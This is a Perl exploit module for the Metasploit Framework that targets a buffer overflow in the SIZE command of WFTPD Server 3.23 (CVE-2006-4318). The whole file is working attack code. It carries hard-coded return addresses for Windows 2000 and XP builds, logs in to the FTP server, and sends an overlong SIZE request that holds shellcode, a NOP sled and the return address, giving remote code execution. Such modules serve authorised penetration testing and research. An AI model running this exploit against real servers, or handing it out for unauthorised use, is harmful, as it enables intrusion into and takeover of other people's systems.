
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wftpd_size_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'    => 'WFTPD Server 3.23 SIZE Command Buffer Overflow',
	'Version' => '$Revision: 1.0 $',
	'Authors' =>
	  [ 'Jacopo Cervini <acaro [at] jervus.it>',
		
	  ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'test'],
		'PASS'  => [1, 'DATA', 'Password', 'test'],
		'FLAG'  => [1, 'BOOL', 'Set to 1 if your user have a 
restrict to home directory flag'],
	  },

	'Payload' =>
	  {
		'Space'  => 400,
		'BadChars'  => "\x00\x0a",

		
		'Keys' 		=> ['+ws2ord'],
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
      This module exploits the buffer overflow found in the SIZE command
      in WFTPD Server 3.23.   
 	Credit to h07 for the discovery of this vulnerability.
}),

	'Refs'  =>
	  [
		['BID', '19617'],
		[ 'CVE', '2006-4318' ],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [

	['Win2k English SP4', 0x7c2d15e7 ], #call esi in ADVAPI32.dll
	['Win2k Italian SP4', 0x792615e7 ], #call esi in ADVAPI32.dll
	['WinXP Pro English SP2', 0x77dd6eda ], #call esi in 
ADVAPI32.dll
	['WinXP Pro Italian SP2', 0x77f46eda ], #call esi in 
ADVAPI32.dll
	['WinXP Pro English SP0', 0x77dd19ae ], #call esi in 
ADVAPI32.dll
	  ],

	'Keys' => ['wftpd'],

	'DisclosureDate' => 'Aug 21 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => 
$advanced}, @_);
	return($self);
}


sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];
	
		if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP 
module.");
		return;
	}

	
    

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . 
$s->GetError);
		return;
	}
	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using ret 
address at 0x%.8x...", $target->[1]));

	my $r = $s->RecvLineMulti(20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); 
return; }
	$self->Print($r);

	$s->Send("USER ".$self->GetVar('USER')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); 
return; }
	$self->Print($r);

	$s->Send("PASS ".$self->GetVar('PASS')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); 
return; }
	$self->Print($r);

if ($self->GetVar('FLAG') == 0) {

	$a="/";

		}

if ($self->GetVar('FLAG') == 1) {
		
	$a="//";
	}

my $request = $a.$shellcode;
	$request .= $self->MakeNops(0x20d-length($shellcode));
    	$request .= pack("V", $target->[1]);


	$s->Send("SIZE $request\r\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); 
return; }
	$self->Print($r);

	sleep(2);
	return;
}


